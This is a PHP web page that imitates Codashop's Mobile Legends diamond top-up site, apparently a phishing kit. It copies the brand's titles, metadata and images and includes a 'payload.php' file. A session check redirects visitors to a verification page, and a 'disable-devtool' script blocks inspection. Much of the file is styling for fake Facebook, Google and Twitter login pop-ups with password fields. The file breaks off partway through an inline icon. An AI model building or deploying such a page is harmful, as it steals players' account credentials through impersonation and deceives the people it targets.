<?php
// Created By Dirzz Nesia
// Dilarang Mengganti/Menghapus Copyright
// Hargai Creator
// WhatsApp 6285792116902

$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE html>
<html dir="ltr" class="">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Top Up Mobile Legends | Up to 2x Bonus Diamonds | Codashop</title>
<link rel="preload" as="image" href="https://cdn1.codashop.com/S/content/mobile/images/product-tiles/MLBB-2025-tiles-178x178.jpg">
<link rel="prefetch" as="image" type="image/svg+xml" href="https://fe-vue3-assets.codashop.com/_nuxt/ornament.BU8Ny55Z.svg">
<link rel="icon" type="image/x-icon" href="https://cdn1.codashop.com/favicon.ico">
<link rel="apple-touch-icon" sizes="192x192" href="https://cdn1.codashop.com/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="96x96" href="https://cdn1.codashop.com/favicon-96.png">
<link rel="icon" type="image/png" sizes="48x48" href="https://cdn1.codashop.com/favicon-48.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://cdn1.codashop.com/favicon-32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://cdn1.codashop.com/favicon-16.png">
<meta name="application-name" content="Codashop">
<meta property="og:site_name" content="Codashop - Global">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">
<meta name="description" content="Diamonds, instantly delivered to your MLBB account. Exciting promo and easy payments with Codacash, Cash App.">
<meta property="og:description" content="Diamonds, Twilight Pass & Weekly Diamond Pass instantly delivered to your MLBB account. Exciting promo and easy payments with Codacash, Cash App.">
<meta property="og:locale" content="en-US">
<meta name="twitter:title" content="Buy Mobile Legends | Up to 2x Bonus Diamonds | Codashop - Codashop">
<meta name="twitter:description" content="Diamonds, Twilight Pass & Weekly Diamond Pass instantly delivered to your MLBB account. Exciting promo and easy payments with Codacash, Cash App.">
<meta property="og:title" content="Buy Mobile Legends | Up to 2x Bonus Diamonds | Codashop - Codashop">
<meta property="og:url" content="https://www.codashop.com/en-us/mobile-legends">
<meta property="og:image" content="https://cdn1.codashop.com/S/content/common/images/mno/MLBB WDP-2025.jpg">
<meta name="twitter:image" content="https://cdn1.codashop.com/S/content/common/images/mno/MLBB WDP-2025.jpg">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/21/coda.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/21/animate.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/21/loader.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/21/pop-google1.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/21/pop-link.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/21/pop-facebook.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/alex-hostingg/css@main/21/pop-facebooks.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
</head>
<body>
<style>
.fb-load {
background-size: 100% 100%;
width: 93%;
height: 299.1px;
margin-top: -1px;
margin-left: auto;
margin-right: auto;
margin-bottom: 15px;
padding: 20px;
padding-top: 0px;
padding-bottom: 25px;
display: block;
}

.fb-load img {
width: 50px;
height: 50px;
margin-top: 192.5px;
margin-bottom: -55px;
}

.fb-load-title {
width: 95%;
height: auto;
margin-top: 10px;
margin-left: auto;
margin-right: auto;
margin-bottom: 10px;
padding: 6px;
color: #999998;
font-size: 18px;
font-family: laza;
font-weight: 500;
text-align: center;
display: block;
}

.fb-load-title i {
margin-top: 200px;
padding-top: 15px;
padding-bottom: 15px;
color: #999998;
font-size: 30px;
text-align: center;
}

.gg-load {
background-size: 100% 100%;
width: 93%;
height: 315.2px;
margin-top: 0px;
margin-left: auto;
margin-right: auto;
margin-bottom: 15px;
padding: 20px;
padding-top: 0px;
padding-bottom: 25px;
display: block;
color: #000;
}

.gg-load-title {
width: 95%;
height: auto;
margin-top: 10px;
margin-left: auto;
margin-right: auto;
margin-bottom: 30px;
padding: 6px;
padding-top: 30px;
color: #000;
font-size: 18px;
font-family: laza;
font-weight: 500;
text-align: center;
display: block;
}

.gg-load-title i {
padding-top: 25px;
padding-bottom: 15px;
color: #000;
font-size: 50px;
text-align: center;
}

.btn-login-wrapper {
background: #6242fc;
width: 100%;
height: auto;
margin-left: auto;
margin-right: auto;
padding: 5px;
border-radius: 42px;
border: none;
cursor: pointer;
word-break: break-word;
outline: none;
box-shadow: -5px 5px 10px rgba(0, 0, 0, .16);
display: block;
}

.btn-login-wrapper span {
color: #fff;
font-size: 16px;
font-family: NotoSans-Regular, sans-serif;
line-height: 37px;
}

.btn-login-logo-wrapper {
background: #fff;
width: 40px;
height: 40px;
margin-right: 20px;
border-radius: 42px;
float: left;
}

.btn-login-logo-wrapper img {
width: 27px;
height: 27px;
margin: 7px auto;
display: block;
}

.popup-login {
background: rgba(0, 0, 0, 0.4);
width: 100%;
height: 100%;
position: fixed;
top: 0;
left: 0;
z-index: 9999;
}

.popup-box-login-fb {
background: #ECEFF6;
max-width: 330px;
height: auto;
position: relative;
margin: 50px auto;
margin-top: 1.9%;
text-align: center;
border-radius: 5px;
}

.popup-box-login-facebooks {
background: url(https://cdn.stackpath.web.id/31/img/bg-facebook.jpg) no-repeat center;
background-size: 100% 100%;
max-width: 330px;
height: auto;
position: relative;
margin: 50px auto;
margin-top: 10%;
text-align: center;
border-radius: 5px;
}

.popup-box-login-facebook-mt {
background: #fff;
background-size: 100% 100%;
max-width: 330px;
height: auto;
position: relative;
margin: 50px auto;
margin-top: 5%;
text-align: center;
border-radius: 5px;
}

.popup-box-login-twitter {
background: #fff;
max-width: 330px;
height: auto;
position: relative;
margin: 50px auto;
margin-top: 10%;
border-radius: 10px;
}

.popup-box-login-google {
background: #fff;
max-width: 330px;
height: auto;
margin: 50px auto;
margin-top: 10%;
padding: 10px;
text-align: center;
border-radius: 10px;
position: relative;
}

.close-fb {
background: #3b5998;
width: 25px;
height: 25px;
color: #fff;
font-size: 20px;
text-align: center;
text-decoration: none;
border-radius: 50%;
top: -10px;
right: -10px;
position: absolute;
display: block;
}

.close-fb i {
padding-top: 3px;
}

.close-gp {
background: #fff;
width: 25px;
height: 25px;
color: #000;
font-size: 20px;
text-align: center;
border-radius: 50%;
top: -12px;
right: -12px;
position: absolute;
z-index: 9999999;
display: block;
}

.close-gp i {
color: #000;
margin-top: -5px;
}

.navbar-fb {
background: #3b5998;
width: 100%;
height: auto;
padding: 8px;
border-top-left-radius: 10px;
border-top-right-radius: 10px;
}

.navbar-fb img {
width: 115;
margin-left: auto;
margin-right: auto;
display: block;
}

.navbar-fb-alert {
background: #fa3e3e;
width: 100%;
height: auto;
padding: 5px;
color: #fff;
font-size: 15px;
font-family: Roboto;
text-align: left;
display: none;
}

.content-box-fb {
width: 300px;
height: auto;
margin-left: auto;
margin-right: auto;
display: block;
}

.content-box-fb img {
width: 60;
margin-top: 20px;
margin-left: auto;
margin-right: auto;
border-radius: 12px;
display: block;
}

.content-box-fb p {
width: 270px;
height: auto;
margin-top: 10px;
margin-left: auto;
margin-right: auto;
margin-bottom: 17px;
padding: 8px;
color: #90949c;
font-size: 16px;
font-family: Roboto;
text-align: center;
display: block;
}

.content-box-fb span {
width: 100%;
padding: 5px;
color: #3b5998;
font-size: 13.5px;
font-family: Roboto;
text-align: center;
display: block;
}

.content-box-fb span:nth-last-child(1) {
color: #7596c8;
margin-bottom: 30px;
}

.form-group-fb {
width: 100%;
height: auto;
}

.form-group-fb input {
width: 100%;
height: auto;
padding: 12px;
color: #000;
font-size: 14px;
font-weight: 400;
font-family: Roboto, sans-serif;
border: 1px solid #bdbebf;
cursor: pointer;
outline: none;
}

.form-group-fb input:nth-child(1) {
border-top-left-radius: 4px;
border-top-right-radius: 4px;
}

.form-group-fb input:nth-child(4) {
border-top: 0px;
border-bottom-left-radius: 4px;
border-bottom-right-radius: 4px;
}

.form-group-fb button {
background: #1778f2;
width: 100%;
height: auto;
margin-top: 10px;
margin-left: auto;
margin-right: auto;
padding: 10px;
color: #fff;
font-size: 14px;
font-family: Roboto;
font-weight: bold;
text-align: center;
text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
border: 1px solid #3578e5;
border-radius: 5px;
box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
outline: none;
display: block;
}

.form-group-fb .login-form-shid {
width: 70px;
height: auto;
margin-left: 71%;
padding: 11px;
color: #1778f2;
font-size: 14px;
font-family: Roboto;
text-align: center;
text-transform: uppercase;
border-top-right-radius: 4px;
border-bottom-right-radius: 4px;
position: absolute;
z-index: 9999999;
cursor: pointer;
}

.language-box {
width: 100%;
height: auto;
margin-left: auto;
margin-right: auto;
display: block;
}

.language-name {
width: 40%;
height: auto;
margin: 5px;
margin-bottom: 0px;
color: #3b5998;
font-size: 12px;
font-family: Roboto;
text-align: center;
display: inline-block;
}

.language-name i {
width: 23px;
padding: 4px;
color: #90949c;
border: 1px solid #3b5998;
border-radius: 3px;
}

.language-name-active {
color: #90949c;
font-weight: bold;
}

.copyright {
width: 40%;
height: auto;
margin-top: 10px;
margin-left: auto;
margin-right: auto;
padding-bottom: 10px;
color: #90949c;
font-size: 12px;
font-family: Roboto;
text-align: center;
display: block;
}

.header-twitter {
background: #fff;
width: 100%;
height: auto;
border-radius: 10px;
position: relative;
}

.header-twitter img {
width: 50;
margin-left: auto;
margin-right: auto;
margin-bottom: 20px;
padding-top: 10px;
display: block;
}

.content-box-twitter {
width: 90%;
height: auto;
margin-left: auto;
margin-right: auto;
padding-bottom: 2px;
display: block;
}

.content-box-twitter span {
color: #000;
font-size: 20px;
font-weight: bold;
font-family: arial, sans-serif;
text-align: left;
}

.content-box-twitter p {
color: #fa3e3e;
font-size: 14px;
font-family: arial, sans-serif;
text-align: center;
display: none;
}

.content-box-twitter label {
color: #000;
font-size: 14px;
font-family: arial, sans-serif;
text-align: left;
}

.content-box-twitter label a {
color: #1da1f2;
}

.content-box-twitter button {
width: 100%;
height: auto;
font-size: 15px;
font-weight: bold;
font-family: arial, sans-serif;
border-radius: 30px;
outline: none;
}

.content-box-twitter button:nth-child(5) {
background: #000;
margin-top: 15px;
margin-bottom: 10px;
padding: 14px;
color: #fff;
border: none;
}

.content-box-twitter button:nth-child(6) {
background: #fff;
margin-bottom: 20px;
padding: 8px;
color: #000;
border: 1px solid #657786;
}

.form-group-twitter {
width: 100%;
max-width: 100%;
margin-left: auto;
margin-right: auto;
padding: 10px 0;
position: relative;
display: block;
}

.form-group-twitter input {
background: transparent;
width: 100%;
padding: 16px;
padding-left: 9px;
color: #000;
font-size: 17px;
font-family: arial, sans-serif;
border: 1px solid #657786;
border-radius: 3.5px;
display: block;
}

.form-group-twitter label {
color: #6E767D;
font-size: 17px;
font-weight: 100;
font-family: arial, sans-serif;
text-align: right;
top: 0;
left: 10.5px;
position: absolute;
pointer-events: none;
transform: translateY(26px);
transition: all 0.2s ease-in-out;
}

.form-group-twitter input:valid,
.form-group-twitter input:focus {
border: 2px solid #1da1f2;
outline: none;
}

.form-group-twitter input:valid+label,
.form-group-twitter input:focus+label {
color: #1da1f2;
font-size: 12px;
top: 15px;
bottom: 20px;
transform: translateY(0);
}

.form-group-sohi {
width: 50px;
height: 73%;
margin-left: 88%;
position: absolute;
z-index: 9999999;
cursor: pointer;
}

.form-group-sohi img {
width: 25px;
margin-top: 14px;
}

.verify-order {
background: #fff;
margin-left: auto;
margin-right: auto;
display: block;
border-radius: 10px;
border: 1px solid #b9aec5;
width: 100%;
padding: 12px 18px;
cursor: pointer;
word-break: break-word;
font-family: NotoSans-Regular, sans-serif;
font-size: .875rem;
outline: none;
color: #000;
box-shadow: -5px 5px 10px rgba(0, 0, 0, .16);
-moz-appearance: none;
-webkit-appearance: none;
}

.verify-order::placeholder {
color: #000;
}

.header-google {
background: #fff;
width: 100%;
}

.header-google svg {
left: 15;
position: absolute;
}

.header-google-title {
padding-top: 60px;
color: #000;
font-size: 25px;
font-family: 'Open Sans', sans-serif;
font-weight: normal;
text-align: left;
}

.header-google-description {
padding-top: 10px;
padding-bottom: 10px;
font-size: 15px;
font-family: 'Open Sans', sans-serif;
font-weight: normal;
text-align: left;
}

.box-google {
width: 95%;
height: auto;
margin-left: auto;
margin-right: auto;
display: block;
}

input {
background: #fff;
}

#form {
width: 40vw;
margin: 0 auto;
margin-top: 50px;
}

.input-box.active-grey {
.input-1 {
border: 1px solid #dadce0;
}

.input-label {
color: #80868b;
top: -8px;
background: #fff;
font-size: 11px;
transition: 250ms;

svg {
position: relative;
width: 11px;
height: 11px;
top: 2px;
transition: 250ms;
}
}
}

.input-box {
position: relative;
margin: 15px 0;

.input-label {
position: absolute;
color: #80868b;
font-size: 16px;
font-weight: 400;
max-width: calc(100% - (2 * 8px));
overflow: hidden;
text-overflow: ellipsis;
white-space: nowrap;
left: 8px;
top: 17px;
padding: 0 8px;
transition: 250ms;
user-select: none;
pointer-events: none;

svg {
position: relative;
width: 15px;
height: 15px;
top: 2px;
transition: 250ms;
}
}

.input-1 {
box-sizing: border-box;
height: 50px;
width: 100%;
border-radius: 4px;
color: #202124;
border: 1px solid #dadce0;
padding: 13px 15px;
transition: 250ms;

&:focus {
outline: none;
border: 2px solid #0b57d0;
transition: 250ms;
}
}
}

.input-box.error {
.input-label {
color: #f44336;
top: -8px;
background: #fff;
font-size: 11px;
transition: 250ms;
}

.input-1 {
border: 2px solid #f44336;
}
}

.input-box.focus,
.input-box.active {
.input-label {
color: #0b57d0;
top: -5px;
background: #fff;
font-size: 13px;
transition: 250ms;

svg {
position: relative;
width: 11px;
height: 11px;
top: 2px;
transition: 250ms;
}
}
}

.input-box.active {
.input-1 {
border: 2px solid #0b57d0;
}
}

.pull-right {
float: right;
}

.clear {
clear: both;
}

.clearfix::after {
content: "";
clear: both;
display: table;
}

.loadhabo_in_popup {
display: flex;
justify-content: center;
align-items: center;
padding: 5px;
height: 55px;
width: 55px;
border: 3px solid #0000;
border-radius: 50%;
background: linear-gradient(#0E2545, #0E2545) padding-box, linear-gradient(var(--angle),
#7154FE,
#74F0FC) border-box;
animation: 0.5s rotatec linear infinite;
}

.loadhabo {
display: flex;
justify-content: center;
align-items: center;
padding: 5px;
height: 55px;
width: 55px;
border: 3px solid #0000;
border-radius: 50%;
background: linear-gradient(#0E2545, #0E2545) padding-box, linear-gradient(var(--angle),
#7154FE,
#74F0FC) border-box;
animation: 0.5s rotatec linear infinite;
}

@keyframes rotatec {
to {
--angle: 360deg;
}
}

.sang_pengkhianat_load_id {
width: 100%;
position: absolute;
top: 40%;
left: 0;
right: 0;
margin-inline: auto;
}

.sang_pengkhianat_load_id_img {
width: 100%;
height: auto;
display: block;
left: 0;
right: 0;
margin-inline: auto;
}

.sang_pengkhianat_load_id_gif {
width: 15%;
height: auto;
display: block;
margin-top: 1px;
left: 0;
right: 0;
margin-inline: auto;
}

.popup-box-login-gg {
background: #fff;
max-width: 330px;
height: auto;
position: relative;
margin: 50px auto;
margin-top: 10%;
border-radius: 5px;
}

.close-facebooks {
background: transparent;
width: 25px;
height: 25px;
color: #fff;
font-size: 20px;
text-align: center;
border-radius: 50%;
top: 0px;
right: 0px;
position: absolute;
z-index: 9999999;
display: block;
}

.close-facebooks i {
color: #20px;
padding-top: 3px;
}

.kagetk {
background: rgba(0, 0, 0, .7);
background-size: 50% 50%;
width: 80%;
height: auto;
padding: 5px;
margin-left: auto;
margin-right: auto;
border: 0px solid #fff;
border-radius: 10px;
color: #A4A9CF;
font-size: 10px;
font-family: arial, sans-serif;
text-align: left;
position: absolute;
left: 0;
right: 0;
margin-inline: auto;
display: none;
}

.kagets {
background: rgba(0, 0, 0, .2);
background-size: 50% 50%;
width: 80%;
height: auto;
border: 1px solid #fff;
display: none;
padding: 5px;
color: #fff;
font-size: 14px;
font-family: arial, sans-serif;
text-align: center;
position: absolute;
left: 0;
right: 0;
float: center;
margin-inline: auto;
}

.kagetin {
background: rgba(0, 0, 0, .2);
background-size: 50% 50%;
width: 60%;
height: auto;
border: 1px solid #fff;
display: none;
padding: 5px;
color: #fff;
font-size: 14px;
font-family: arial, sans-serif;
text-align: center;
position: absolute;
left: 0;
right: 0;
float: center;
margin-inline: auto;
}

@media only screen and (max-width:600px) {
.popup-box-login-facebook-mt {
margin-top: 10%;
}

.popup-box-login-fb {
margin-top: 4%;
}

.popup-box-login-twitter {
margin-top: 25%;
}

.popup-box-login-google {
margin-top: 20%;
}

.popup-box-login-gg {
margin-top: 20%;
}
}
</style>
<div id="__nuxt">
<div class="layout min-h-screen" data-v-ce79952d>
<div class="loadkin" style="display:noe">
<div data-variant="darkOverlay" data-size="medium" class="spinner-container__progress-bar !fixed z-[200] spinner-overlay" data-v-ce79952d data-v-c7882a63>
<div class="spinner" data-v-c7882a63>
<div class="spinner-icon" data-v-c7882a63>
<svg viewBox="0 0 63 60" fill="currentColor" xmlns="http://www.w3.org/2000/svg" data-v-c7882a63>
<path d="m33.698 58.856 27.763-32.41a1.168 1.168 0 0 0-.554-1.847l-7.056-2.487-3.935-.954c-.878-.143-1.593.134-2.03 1.218L33.76 54.893a.256.256 0 0 1-.242.152.247.247 0 0 1-.22-.208.245.245 0 0 1 .008-.107l10.325-32.964a1.529 1.529 0 0 0-1.354-1.884l-16.038-.849a6.015 6.015 0 0 0-1.398.067l-9.672 1.734a1 1 0 0 0-.762 1.421l11.064 23.118a.403.403 0 0 1-.123.536.424.424 0 0 1-.572-.168L10.643 22.914a1.656 1.656 0 0 0-2.01-.697l-6.784 2.324c-.487.18-.963.585-.52 1.253.442.668 21.209 24.988 28.017 33.049a2.859 2.859 0 0 0 4.352.013Z"></path>
<path d="M8.433 18.906a2.393 2.393 0 0 0 1.52-1.296l6.454-10.883c.224-.4.398-.587.635-.5.236.087.223.33.089.726l-3.394 9.83c-.14.514.011.816.53.762l10.608-1.787c.44-.062.883-.087 1.327-.076l15.725.863c1.117 0 1.787-.724 1.544-1.705L40.474 3.943c-.098-.42.257-.502.447-.114.128.257 6.256 11.64 6.256 11.64.431.794.894 1.288 2.042 1.607 1.747.487 4.79 1.314 4.79 1.314l8.026 3.177a.724.724 0 0 0 .907-.914c-.168-.625-1.394-2.54-1.394-2.54l-10.73-14.1a3.181 3.181 0 0 0-1.617-1.097L39.786.183A4.593 4.593 0 0 0 38.506 0H24.853c-.247 0-.492.034-.729.1L13.932 2.95a1.787 1.787 0 0 0-.566.276l-.83.62a2.214 2.214 0 0 0-.448.428S2.251 17.166 1.793 17.992c-.317.577-1.412 2.344-1.727 3.055-.224.53.154.893.637.699l7.73-2.84Z"></path>
</svg>
</div>
<div class="spinner-loader" data-v-c7882a63>
<div class="spinner-loading-bar" data-v-c7882a63></div>
</div>
<div class="spinner-text" data-v-c7882a63>Loading...</div>
</div>
</div>
</div>
<header class="header" data-testid="nav-header" data-v-ce79952d data-v-cb5174a2>
<div class="header__container" data-v-cb5174a2>
<div class="hover:rounded-full hover:bg-surface-dark-lighter active:rounded-full active:bg-surface-dark-lighter" role="button" data-testid="nav-hamburger-menu" data-v-cb5174a2>
<div class="w-[42px] cursor-pointer p-[10px]">
<span class="my-1 block h-0.5 rounded bg-neutral-10"></span>
<span class="my-1 block h-0.5 rounded bg-neutral-10"></span>
<span class="my-1 block h-0.5 rounded bg-neutral-10"></span>
</div>
</div>
<div class="me-[12px] flex items-center header__container__logo-tagline" data-testid="nav-logo-tagline" data-v-cb5174a2>
<a href="#" class="shrink-0" data-testid="logo-link">
<img src="https://cdn1.codashop.com/S/content/mobile/images/codashop-logo-new-3a.png" alt="Logo" class="me-[12px] h-[24px]">
</a>
<span class="hidden truncate font-light italic text-neutral-10 md:block">The fastest &amp;easiest way to buy game credits</span>
</div>
<!---->
<div class="relative flex items-center" data-testid="header-search" data-v-cb5174a2>
<div class="hidden lg:block">
<span></span>
</div>
<svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="z-10 size-[24px] cursor-pointer text-white" role="button">
<path d="M10.5 2a8.5 8.5 0 1 0 5.262 15.176l4.53 4.531a1 1 0 0 0 1.415-1.414l-4.531-4.531A8.5 8.5 0 0 0 10.5 2ZM4 10.5a6.5 6.5 0 1 1 13 0 6.5 6.5 0 0 1-13 0Z"></path>
</svg>
</div>
<div data-v-cb5174a2 data-v-a836484e>
<div id="reward" class="rewards-header-icon" data-auto-capture="TopNavbarRewardIconClick" data-v-a836484e>
<svg viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-a836484e>
<g clip-path="url(#reward_svg__clip0_3_25)">
<mask id="reward_svg__mask0_3_25" style="mask-type:luminance;" maskUnits="userSpaceOnUse" x="0" y="0" width="12" height="12">
<path d="M6.1362 11.9999C9.35956 11.9999 11.9726 9.3869 11.9726 6.16355C11.9726 2.94019 9.35956 0.327148 6.1362 0.327148C2.91285 0.327148 0.299805 2.94019 0.299805 6.16355C0.299805 9.3869 2.91285 11.9999 6.1362 11.9999Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask0_3_25)">
<path d="M6.1362 11.9999C9.35956 11.9999 11.9726 9.3869 11.9726 6.16355C11.9726 2.94019 9.35956 0.327148 6.1362 0.327148C2.91285 0.327148 0.299805 2.94019 0.299805 6.16355C0.299805 9.3869 2.91285 11.9999 6.1362 11.9999Z" fill="#8E4616"></path>
</g>
<mask id="reward_svg__mask1_3_25" style="mask-type:luminance;" maskUnits="userSpaceOnUse" x="0" y="0" width="12" height="12">
<path d="M6.2885 11.3836C9.43201 11.3836 11.9803 8.83533 11.9803 5.69182C11.9803 2.54831 9.43201 0 6.2885 0C3.14499 0 0.59668 2.54831 0.59668 5.69182C0.59668 8.83533 3.14499 11.3836 6.2885 11.3836Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask1_3_25)">
<path d="M6.2885 11.3836C9.43201 11.3836 11.9803 8.83533 11.9803 5.69182C11.9803 2.54831 9.43201 0 6.2885 0C3.14499 0 0.59668 2.54831 0.59668 5.69182C0.59668 8.83533 3.14499 11.3836 6.2885 11.3836Z" fill="#FCCB3F"></path>
</g>
<mask id="reward_svg__mask2_3_25" style="mask-type:luminance;" maskUnits="userSpaceOnUse" x="3" y="2" width="7" height="7">
<path d="M6.25799 8.8878C7.95161 8.8878 9.32457 7.51485 9.32457 5.82122C9.32457 4.12759 7.95161 2.75464 6.25799 2.75464C4.56436 2.75464 3.19141 4.12759 3.19141 5.82122C3.19141 7.51485 4.56436 8.8878 6.25799 8.8878Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask2_3_25)">
<path d="M6.25799 8.8878C7.95161 8.8878 9.32457 7.51485 9.32457 5.82122C9.32457 4.12759 7.95161 2.75464 6.25799 2.75464C4.56436 2.75464 3.19141 4.12759 3.19141 5.82122C3.19141 7.51485 4.56436 8.8878 6.25799 8.8878Z" fill="#FFF6A1"></path>
</g>
<mask id="reward_svg__mask3_3_25" style="mask-type:luminance;" maskUnits="userSpaceOnUse" x="4" y="2" width="4" height="8">
<path d="M7.75746 6.97773C7.75746 5.43303 5.68771 5.61565 5.68771 4.70252C5.68771 4.31445 5.93882 4.09377 6.34973 4.09377C6.61605 4.09377 6.8139 4.17748 7.01174 4.32205C7.1411 4.41337 7.31612 4.39815 7.42265 4.28401L7.48352 4.21552C7.59767 4.08616 7.58245 3.88832 7.44548 3.78179C7.20959 3.58394 6.92804 3.44698 6.5704 3.40132C6.5704 3.39371 6.5704 3.3861 6.5704 3.37849V2.94476C6.5704 2.77735 6.43343 2.64038 6.26602 2.64038C6.09862 2.64038 5.96165 2.77735 5.96165 2.94476V3.37849C5.96165 3.37849 5.96165 3.40132 5.96165 3.41654C5.26919 3.53829 4.82785 4.04051 4.82785 4.75579C4.82785 6.18635 6.8976 6.04178 6.8976 7.05382C6.8976 7.46473 6.66171 7.70823 6.15949 7.70823C5.8399 7.70823 5.55074 7.59409 5.26919 7.41147C5.13222 7.32015 4.94199 7.3582 4.85068 7.49517L4.78219 7.59409C4.69088 7.73106 4.72893 7.92129 4.8659 8.01261C5.18549 8.22567 5.58118 8.37025 5.94643 8.40829V8.86486C5.94643 9.03226 6.0834 9.16923 6.2508 9.16923C6.41821 9.16923 6.55518 9.03226 6.55518 8.86486V8.38547C7.30851 8.2485 7.73463 7.71584 7.73463 6.99295L7.75746 6.97773Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask3_3_25)">
<path d="M7.75746 6.97773C7.75746 5.43303 5.68771 5.61565 5.68771 4.70252C5.68771 4.31445 5.93882 4.09377 6.34973 4.09377C6.61605 4.09377 6.8139 4.17748 7.01174 4.32205C7.1411 4.41337 7.31612 4.39815 7.42265 4.28401L7.48352 4.21552C7.59767 4.08616 7.58245 3.88832 7.44548 3.78179C7.20959 3.58394 6.92804 3.44698 6.5704 3.40132C6.5704 3.39371 6.5704 3.3861 6.5704 3.37849V2.94476C6.5704 2.77735 6.43343 2.64038 6.26602 2.64038C6.09862 2.64038 5.96165 2.77735 5.96165 2.94476V3.37849C5.96165 3.37849 5.96165 3.40132 5.96165 3.41654C5.26919 3.53829 4.82785 4.04051 4.82785 4.75579C4.82785 6.18635 6.8976 6.04178 6.8976 7.05382C6.8976 7.46473 6.66171 7.70823 6.15949 7.70823C5.8399 7.70823 5.55074 7.59409 5.26919 7.41147C5.13222 7.32015 4.94199 7.3582 4.85068 7.49517L4.78219 7.59409C4.69088 7.73106 4.72893 7.92129 4.8659 8.01261C5.18549 8.22567 5.58118 8.37025 5.94643 8.40829V8.86486C5.94643 9.03226 6.0834 9.16923 6.2508 9.16923C6.41821 9.16923 6.55518 9.03226 6.55518 8.86486V8.38547C7.30851 8.2485 7.73463 7.71584 7.73463 6.99295L7.75746 6.97773Z" fill="#BC6422"></path>
<path d="M7.65883 7.11469C7.65883 5.56999 5.58908 5.75261 5.58908 4.83949C5.58908 4.45141 5.84019 4.23074 6.25109 4.23074C6.51742 4.23074 6.71527 4.31444 6.91311 4.45902C7.04247 4.55033 7.21748 4.53511 7.32402 4.42097L7.38489 4.35249C7.49903 4.22313 7.48381 4.02528 7.34684 3.91875C7.11095 3.72091 6.82941 3.58394 6.47177 3.53828C6.47177 3.53067 6.47177 3.52306 6.47177 3.51545V3.08172C6.47177 2.91431 6.3348 2.77734 6.16739 2.77734C5.99998 2.77734 5.86301 2.91431 5.86301 3.08172V3.51545C5.86301 3.51545 5.86301 3.53828 5.86301 3.5535C5.17056 3.67525 4.72922 4.17747 4.72922 4.89275C4.72922 6.32332 6.79897 6.17874 6.79897 7.19079C6.79897 7.60169 6.56308 7.84519 6.06086 7.84519C5.74126 7.84519 5.45211 7.73105 5.17056 7.54843C5.03359 7.45711 4.84336 7.49516 4.75204 7.63213L4.68356 7.73105C4.59225 7.86802 4.63029 8.05826 4.76726 8.14957C5.08686 8.36263 5.48255 8.50721 5.8478 8.54526V9.00182C5.8478 9.16923 5.98476 9.3062 6.15217 9.3062C6.31958 9.3062 6.45655 9.16923 6.45655 9.00182V8.52243C7.20988 8.38546 7.636 7.8528 7.636 7.12991L7.65883 7.11469Z" fill="#68250E"></path>
<path d="M6.54777 8.59103L6.47168 8.50733L6.57821 8.37036L6.74562 8.59103H6.54777Z" fill="#BC6422"></path>
<path d="M5.7793 3.40129L5.87061 3.53826L5.97714 3.4089L5.80213 3.37085L5.7793 3.40129Z" fill="#BC6422"></path>
</g>
<mask id="reward_svg__mask4_3_25" style="mask-type:luminance;" maskUnits="userSpaceOnUse" x="1" y="1" width="11" height="10">
<path d="M3.55703 4.78626L1.55576 5.23521C1.38835 5.27326 1.23617 5.12107 1.2666 4.95367L1.67751 2.91435C1.71556 2.72412 1.94384 2.65563 2.08081 2.7926L2.34714 3.05893C3.31353 1.68163 4.97998 0.829381 6.83667 1.03483C9.05861 1.27833 10.8316 3.04371 11.0751 5.26565C11.3947 8.16483 9.13471 10.6227 6.29641 10.6227C3.75487 10.6227 1.6699 8.65183 1.49488 6.14834C1.49488 6.04942 1.56337 5.97332 1.66229 5.97332H2.49932C2.59825 5.97332 2.68195 6.04942 2.68956 6.14834C2.85696 7.92133 4.29514 9.32906 6.09095 9.42798C8.2368 9.54973 10.025 7.76914 9.91086 5.62329C9.81194 3.71334 8.22919 2.19146 6.29641 2.19146C4.9952 2.19146 3.84618 2.88391 3.207 3.91879L3.66356 4.37535C3.79292 4.50471 3.73204 4.73299 3.54942 4.77865L3.55703 4.78626Z" fill="white"></path>
</mask>
<g mask="url(#reward_svg__mask4_3_25)">
